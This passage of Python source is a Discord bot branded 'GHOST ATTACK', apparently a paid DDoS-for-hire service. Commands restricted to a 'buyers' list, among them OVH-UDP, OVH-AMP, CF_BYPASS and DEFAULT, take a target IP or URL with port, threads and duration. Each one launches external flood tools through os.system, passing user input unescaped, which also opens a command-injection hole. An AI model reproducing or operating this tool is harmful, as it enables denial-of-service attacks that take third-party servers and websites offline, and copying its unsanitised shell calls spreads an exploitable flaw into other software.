		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node ovh.js {url} {port} {time}")
		
		
@bot.command()
async def OA(ctx, ip, port, thread, throttle):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Ip**", value=f"`{ip}`")
		embed.add_field(name="**Port**", value=f"`{port}`")
		embed.add_field(name="**Methods**", value="`OVH-ACK`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Throttle** ", value=f"`{throttle}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"gcc OVH-ACK.c {ip} {port} {thread} {throttle}")
		
		
@bot.command()
async def OVHAMP(ctx, ip, port):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Ip**", value=f"`{ip}`")
		embed.add_field(name="**Port**", value=f"`{port}`")
		embed.add_field(name="**Methods**", value="`OVH-AMP`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		  
		os.system(f"./OVH-AMP {ip} {port}")
		
		
@bot.command()
async def OVHUDP(ctx, ip, port, packet_size, threads, pps, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Ip**", value=f"`{ip}`")
		embed.add_field(name="**Port**", value=f"`{port}`")
		embed.add_field(name="**Methods**", value="`OVH-UDP`")
		embed.add_field(name="**PPS Limiter**", value=f"`{pps}`")
		embed.add_field(name="**Threads**", value=f"`{threads}`")
		embed.add_field(name="**Time**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		  
		os.system(f"./ovhudp {ip} {port} {pps} {threads} {time}")
		
		
@bot.command()
async def CF_BYPASS(ctx, url, thread, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`CF-BYPASS`")
		embed.add_field(name="**Threads**", value=f"`{thread}")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"node bypasserr.js {url} {thread} {time}")
		
		
		
@bot.command()
async def HOME(ctx, host, port, psize, time):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Host**", value=f"`{host}`")
		embed.add_field(name="**Port**", value=f"`{port}`")
		embed.add_field(name="**Methods**", value="`HOME`")
		embed.add_field(name="**Packet Size**", value=f"`{psize}`")
		embed.add_field(name="**Duration**", value=f"`{time}`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | Requests By {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"perl home.pl {host} {port} {psize} {time}")
		
		
		
@bot.command()
async def DEFAULT(ctx, url, mthd):
	if ctx.author.id not in buyers:
		embedc = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=0xfcb103)
		embedc.add_field(name="**Warning**",value="You Don't Have Permission To Use This Comamnd !")
		embedc.set_footer(text=f"© Owner : MARSS#2962 | Warning {ctx.author.name}")
		await ctx.reply(embed=embedc)
	else:
		embed = discord.Embed(title="🚀 **GHOST ATTACK** 🚀", color=discord.Colour.random())
		embed.set_thumbnail(url="https://fiverr-res.cloudinary.com/images/t_main1,q_auto,f_auto,q_auto,f_auto/attachments/delivery/asset/82380ffc8fe576c18d28f05250f61dc8-1603324282/Preview%20Sample/create-this-cool-neon-animation-discord-avatar.gif")
		embed.add_field(name="**Target**", value=f"`{url}`")
		embed.add_field(name="**Methods**", value="`DEFAULT-DDOS`")
		embed.add_field(name="**Duration**", value=f"`Unknowns`")
		ma1 = ["https://media4.giphy.com/media/8OTxSsEKzMs2A/giphy.gif","https://media1.giphy.com/media/3o7btQ8jDTPGDpgc6I/giphy.gif","https://media3.giphy.com/media/jOZt5tdGYxzz0H6Nfi/giphy.gif","https://media1.giphy.com/media/EKKAwvGF2sF1C7CXsy/giphy.gif"]
		rdma1 = random.choice(ma1)
		embed.set_image(url=rdma1)
		embed.set_footer(text=f"© Owner : MARSS#2962 | {ctx.author.name}", icon_url=ctx.author.avatar)
		
		
		await ctx.send(embed=embed)
		
		os.system(f"go run vlm.go -site {url} {mthd}")
		
	
	
	
	
	
	
	
	
	
	
bot.run(token)